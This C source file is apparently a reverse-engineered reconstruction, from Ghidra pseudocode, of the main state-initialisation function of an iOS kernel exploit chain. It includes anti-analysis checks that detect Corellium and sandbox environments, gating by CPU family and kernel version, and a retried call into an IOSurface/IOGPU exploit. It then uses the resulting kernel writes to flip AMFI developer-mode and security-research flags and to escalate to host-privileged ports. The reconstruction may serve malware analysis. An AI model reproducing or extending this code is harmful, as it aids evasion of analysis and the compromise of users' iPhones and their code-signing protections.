// record_0x90000_e9f89858_state_init.c
// Main exploit state initialization - sub_31ba0 (FUN_000301ac)
// ~1400 lines of Ghidra pseudocode, largest function in 0x90000

#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <IOKit/IOKitLib.h>
#include "coruna_common.h"

// Anti-analysis checks
static int check_corellium(void) {
    struct stat st;
    return stat("/usr/libexec/corelliumd", &st) == 0 ? 0 : 1;
}

static int check_sandbox(void) {
    extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
    return sandbox_check(getpid(), "iokit-get-properties", 0) == 0 ? 0 : 1;
}

static int check_iokit_serial(void) {
    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("IODeviceTree"));
    if (!service) return 1;
    
    CFStringRef serial = IORegistryEntryCreateCFProperty(service, CFSTR("IOPlatformSerialNumber"), 
                                                          kCFAllocatorDefault, 0);
    IOObjectRelease(service);
    if (!serial) return 1;
    
    char buf[32] = {0};
    CFStringGetCString(serial, buf, sizeof(buf), kCFStringEncodingUTF8);
    CFRelease(serial);
    
    return strncmp(buf, "CORELLIUM", 9) == 0 ? 0 : 1;
}

// CPU family detection
static uint32_t get_cpu_family(void) {
    uint32_t family = 0;
    size_t size = sizeof(family);
    sysctlbyname("hw.cpufamily", &family, &size, NULL, 0);
    return family;
}

static uint32_t get_cpu_capability_flags(uint32_t cpu_family, uint32_t xnu_build, uint64_t kaddr) {
    uint32_t flags = 0;
    
    switch (cpu_family) {
        case CPU_A16_EVEREST:
            flags = CAP_A16_EVEREST | 32;
            break;
        case CPU_A15_BLIZZARD:
            flags = CAP_A15_BLIZZARD;
            if (xnu_build > 8791) flags |= 8;
            break;
        case CPU_A17_PRO:
            flags = CAP_A17_PRO | 32;
            break;
        case CPU_A14_LIGHTNING:
            flags = CAP_A14_LIGHTNING;
            break;
        case CPU_M1_M2:
            flags = CAP_M1_M2;
            // Additional logic for M1/M2 variants based on core count
            break;
        case CPU_NEWER_VARIANT:
            if (kaddr > KADDR_THRESHOLD_3) flags = CAP_NEWER_VARIANT;
            break;
        case CPU_OLDER_VARIANT:
            flags = CAP_OLDER_VARIANT;
            break;
    }
    
    return flags;
}

// Kernel version extraction
static uint32_t get_kernel_version(void) {
    char version[256];
    size_t size = sizeof(version);
    
    if (sysctlbyname("kern.osrelease", version, &size, NULL, 0) != 0) {
        return 0;
    }
    
    // Parse "XX.Y.Z" -> return XX * 1000 + Y
    uint32_t major = 0, minor = 0;
    sscanf(version, "%u.%u", &major, &minor);
    
    // Map Darwin version to XNU build
    // Darwin 19 = iOS 13 = xnu-6153
    // Darwin 20 = iOS 14 = xnu-7195
    // Darwin 21 = iOS 15 = xnu-8019/8020
    // Darwin 22 = iOS 16 = xnu-8792/8796
    // Darwin 23 = iOS 17 = xnu-10002
    
    if (major == 19) return XNU_IOS13;
    if (major == 20) return XNU_IOS14;
    if (major == 21) return minor == 0 ? XNU_IOS15_0 : XNU_IOS15_1;
    if (major == 22) return minor < 4 ? XNU_IOS16_0 : XNU_IOS16_1;
    if (major == 23) return XNU_IOS17;
    
    return 0;
}

// State inheritance - fast path (sub_9dc8, sub_13c5c, sub_1393c)
static int try_inherit_state_newest(void *state, uint64_t kaddr) {
    if (kaddr <= KADDR_THRESHOLD_9) return 0;
    
    // Voucher recipe path - sub_9dc8
    // Resolves handle keyed at 0x1122334455667788 + 17
    // Maps 4 pages, scans for magic marker 8
    // Copies 0x6D0 bytes of pre-built state
    
    return 0; // Not implemented - falls through to full exploit
}

static int try_inherit_state_middle(void *state, uint64_t kaddr, uint32_t flags) {
    if (kaddr <= KADDR_THRESHOLD_8 || !(flags & 0x5584001)) return 0;
    
    // Mailbox-style voucher path - sub_13c5c
    // Resolves 3 ports from 0x3122334455667788 + offset
    // Maps connection[0] and object
    // Reads kernel state from mapped page
    
    return 0; // Not implemented
}

static int try_inherit_state_oldest(void *state, uint64_t kaddr) {
    if (kaddr >= KADDR_THRESHOLD_6) return 0;
    
    // Fileport/fstat smuggling path - sub_1393c
    // Resolves 3-4 keyed handles from 0x1122334455667788
    // Converts to fds via fileport_makefd
    // Extracts kernel addresses from st_atimespec
    
    return 0; // Not implemented
}

// Main state initialization - sub_31ba0 (FUN_000301ac)
void sub_31ba0(void **state_ptr) {
    if (!state_ptr || !*state_ptr) return;
    
    void *state = *state_ptr;
    uint32_t *flags = (uint32_t *)((uint8_t *)state + STATE_FLAGS_00);
    uint64_t *kaddr_ptr = (uint64_t *)((uint8_t *)state + STATE_KERNEL_SLIDE);
    uint32_t *xnu_ptr = (uint32_t *)((uint8_t *)state + STATE_KERNEL_VERSION);
    
    // 1. Environment gating
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    
    pthread_mutex_t mutex1 = PTHREAD_MUTEX_INITIALIZER;
    pthread_mutex_t mutex2 = PTHREAD_MUTEX_INITIALIZER;
    pthread_mutex_init(&mutex1, NULL);
    pthread_mutex_init(&mutex2, NULL);
    
    semaphore_t sem;
    semaphore_create(mach_task_self(), &sem, SYNC_POLICY_FIFO, 0);
    
    // Get kernel version
    uint32_t xnu_build = get_kernel_version();
    *xnu_ptr = xnu_build;
    
    // Validate kernel address range
    uint64_t kaddr = *kaddr_ptr;
    if (kaddr < KADDR_THRESHOLD_1 || kaddr > KADDR_THRESHOLD_2) {
        return; // Out of supported range
    }
    
    if (kaddr > KADDR_THRESHOLD_3 && xnu_build < XNU_IOS16_0) {
        return; // Address/build mismatch
    }
    
    // 2. Anti-analysis checks
    if (!check_corellium()) return;
    if (!check_sandbox()) return;
    if (!check_iokit_serial()) return;
    
    // 3. CPU family → capability flags
    uint32_t cpu_family = get_cpu_family();
    uint32_t cap_flags = get_cpu_capability_flags(cpu_family, xnu_build, kaddr);
    *flags |= cap_flags;
    
    // Check hw.model for iPhone prefix on newer kernels
    if (kaddr > KADDR_THRESHOLD_3) {
        char model[32] = {0};
        size_t size = sizeof(model);
        if (sysctlbyname("hw.model", model, &size, NULL, 0) == 0) {
            if ((model[0] & 0xDF) != 0x4A) { // Not 'J' (iPhone)
                return;
            }
        }
    }
    
    // 4. State inheritance - fast path
    int inherited = 0;
    
    inherited = try_inherit_state_newest(state, kaddr);
    if (inherited) return;
    
    inherited = try_inherit_state_middle(state, kaddr, *flags);
    if (inherited) return;
    
    inherited = try_inherit_state_oldest(state, kaddr);
    if (inherited) return;
    
    // 5. Full exploit path - sub_8a48
    // This is the actual IOSurface/IOGPU exploit loop
    int result = 0;
    for (int retry = 0; retry < 5; retry++) {
        result = sub_8a48(state);
        if (result == 1) break;
        if (result != 258054) break; // Not retriable error
    }
    
    if (result != 1) {
        return; // Exploit failed
    }
    
    // 6. Kernel read/write primitives are now available
    // Installed by sub_8a48 into state structure
    
    // 7. Policy and entitlement patching
    // Resolve AMFI kext, patch developer_mode_status and allows_security_research
    extern int sub_1b5dc(void *state, const char *kext_name, void **out_ctx);
    extern int sub_15628(void *state, void *kext_ctx, const char *symbol, uint64_t *out_addr);
    extern int sub_1df78(void *state, uint64_t addr, void *out_buf, size_t size);
    extern int sub_1e8e0(void *state, uint64_t addr, uint8_t value);
    
    void *amfi_ctx = NULL;
    if (sub_1b5dc(state, "com.apple.driver.AppleMobileFileIntegrity", &amfi_ctx) == 1) {
        uint64_t dev_mode_addr = 0, sec_research_addr = 0;
        
        if (sub_15628(state, amfi_ctx, "developer_mode_status", &dev_mode_addr) == 1) {
            uint8_t current = 0;
            if (sub_1df78(state, dev_mode_addr, &current, 1) == 1 && current == 0) {
                sub_1e8e0(state, dev_mode_addr, 1);
            }
        }
        
        if (sub_15628(state, amfi_ctx, "allows_security_research", &sec_research_addr) == 1) {
            uint8_t current = 0;
            if (sub_1df78(state, sec_research_addr, &current, 1) == 1 && current == 0) {
                sub_1e8e0(state, sec_research_addr, 1);
            }
        }
    }
    
    // 8. Task and host escalation
    extern int sub_31350(void *state, mach_port_t task, int arg2, int arg3);
    extern int sub_2f660(void *state, mach_port_t *out_host_priv);
    extern int sub_306f4(void *state, mach_port_t task);
    
    sub_31350(state, mach_task_self(), 0, 0);
    
    mach_port_t host_priv = MACH_PORT_NULL;
    if (sub_2f660(state, &host_priv) == 1) {
        mach_port_t *host_priv_ptr = (mach_port_t *)((uint8_t *)state + STATE_HOST_PRIV);
        *host_priv_ptr = host_priv;
        
        // Verify host_priv by calling host_get_special_port with invalid selector
        mach_port_t test_port = MACH_PORT_NULL;
        host_get_special_port(host_priv, -1, 16, &test_port); // HOST_KEXTD_PORT
    }
    
    sub_306f4(state, mach_task_self());
    
    // 9. Terminal publication
    extern int sub_14774(void *state);
    extern int sub_14a04(void *state);
    extern int sub_9b74(void *state);
    
    if (kaddr <= KADDR_THRESHOLD_8) {
        sub_14774(state);
    } else if (kaddr > KADDR_THRESHOLD_9) {
        sub_9b74(state);
    } else if (*flags & 0x5584001) {
        sub_14a04(state);
    }
}

// Wrapper called from sub_331ec (state object create/init)
void sub_331ec(void *outer_ctx, void *arg2, void **out_state) {
    if (!out_state) return;
    
    // Allocate 0x1D60-byte state object
    void *state = calloc(1, 0x1D60);
    if (!state) {
        *out_state = NULL;
        return;
    }
    
    // Initialize state structure
    memset(state, 0, 0x1D60);
    
    // Call main init
    sub_31ba0(&state);
    
    *out_state = state;
}
